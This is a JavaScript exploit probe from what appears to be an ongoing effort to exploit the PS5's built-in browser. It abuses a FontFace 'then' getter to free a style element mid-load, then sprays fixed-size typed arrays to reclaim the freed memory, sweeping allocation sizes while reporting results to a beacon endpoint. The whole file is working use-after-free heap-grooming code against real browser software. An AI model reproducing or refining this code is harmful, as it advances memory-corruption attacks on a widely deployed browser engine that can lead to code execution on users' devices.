// p458-lowchurn — mass-claim sweep with ZERO page reloads
// Beacon prefix: V458- (LC- tags)
//
// The PS5 guide browser leaks on document reloads themselves: any
// reload loop, however well-cleaned, eventually triggers the console's
// "not enough free system memory" dialog. This probe NEVER reloads:
// all rounds run in one document, 8 seconds apart, with full cleanup
// between rounds and a hard OOM guard (allocation failure stops the
// sweep instead of surfacing a console dialog).
//
// Remaining sizes only: the mass sweep already survived 96..640 with
// zero kills (2+ full cycles); what's left is 768..1536 — the top of
// p446's proven-claimable mix.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var SIZES = [768, 1024, 1280, 1536];
  var ROUNDS_PER_K = 4;
  var ROUND_MS = 8000;          // slow cadence on purpose
  var N = 64;

  var kIdx = 0, roundInK = 0, stopped = false;
  try {
    var s = parseInt(localStorage.getItem('p458lc') || '0', 10);
    if (s >= 0 && s < SIZES.length) kIdx = s;
  } catch(e) {}

  function K() { return SIZES[kIdx]; }

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('LC-ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  B('LC-BOOT-k' + K());

  var OK = 'local(Helvetica)';
  var bufs = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        bufs = [];
        try {
          for (var i = 0; i < N; i++) {
            var u8 = new Uint8Array(new ArrayBuffer(K()));
            u8[0] = 0x46; u8[1] = 0x34; u8[2] = 0x34; u8[3] = 0x56;  // V44V
            u8[4] = i;
            bufs.push(u8);
          }
        } catch(e) {
          // allocation failed: memory is tight. STOP everything — a JS
          // exception here is free; letting the console hit its cap is
          // what shows the user an error dialog. Never do that.
          B('MK' + K() + '-OOMGUARD');
          stop('OOM guard tripped — sweep parked safely');
          return;
        }
      }
      return undefined;
    },
    configurable: true
  });

  function stop(msg) {
    stopped = true;
    hb.textContent = 'p458-lowchurn STOPPED: ' + msg;
    hb.style.color = '#ff0';
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    bufs = [];
  }

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round() {
    if (stopped) return;
    var kk = K();
    hb.textContent = 'p458-lowchurn k=' + kk + ' round ' + (roundInK + 1) + '/' + ROUNDS_PER_K + ' RUNNING';
    B('MK' + kk + '-GO');

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) {
      B('MK' + kk + '-NOFACE');
      cleanup();
      setTimeout(round, ROUND_MS);
      return;
    }

    void face.loaded;
    face.load().then(
      function() {
        if (stopped) return;
        B('MK' + kk + '-SURVIVED');
        cleanup();
        roundInK++;
        if (roundInK >= ROUNDS_PER_K) {
          roundInK = 0;
          kIdx = (kIdx + 1) % SIZES.length;
          try { localStorage.setItem('p458lc', String(kIdx)); } catch(e) {}
        }
        hb.textContent = 'p458-lowchurn k=' + kk + ' SURVIVED — next in 8s';
        setTimeout(round, ROUND_MS);
      },
      function() {
        if (stopped) return;
        B('MK' + kk + '-NO0');
        cleanup();
        setTimeout(round, ROUND_MS);
      }
    );
  }

  round();
})();
